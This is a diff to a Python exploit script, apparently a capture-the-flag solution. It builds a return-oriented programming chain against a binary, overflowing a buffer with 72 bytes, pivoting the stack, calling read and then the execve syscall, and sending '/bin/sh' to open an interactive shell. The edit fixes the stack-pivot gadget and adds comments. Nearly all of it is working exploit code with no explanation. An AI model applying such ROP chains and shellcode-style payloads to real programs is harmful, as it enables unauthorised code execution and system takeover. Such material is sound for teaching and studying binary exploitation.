@@ -42,13 +42,14 @@ pop_rdx_rsi = 0x44bd59
 pop_rdi = 0x400696
 pop_rax = 0x4155a4
 push_rsp = 0x450a84
+mov_rsp_rsi = 0x400b84
 syscall = 0x40128c
 ret = 0x400416
 
 #ROPchain
 read8 = [pop_rdi, 0x00, pop_rdx_rsi, 0x08, buffer, read_text]
 read256 = [pop_rdi, 0x00, pop_rdx_rsi, 0x100, buffer, read_text]
-mov_rsp = [pop_rsp + buffer + ret]
+mov_rsp = [mov_rsp_rsi]
 execve = [pop_rax, 0x3b, pop_rdx_rsi, 0x00, 0x00, pop_rdi, buffer, syscall]
 
 
@@ -65,10 +66,10 @@ else:
 
 input("wait")
 time.sleep(0.5)
-r.send(b"a"*72 + rop_chain(read256 + [pop_rsp]
+r.send(b"a"*72 + rop_chain(read256 + mov_rsp))  # prima read
 time.sleep(0.2)
-r.send(rop_chain(read8 + execve))
+r.send(rop_chain(read8 + execve))               # read256
 time.sleep(0.2)
-r.send(b"/bin/sh\x00")
+r.send(b"/bin/sh\x00")                          # read8
 time.sleep(0.2)
 r.interactive()
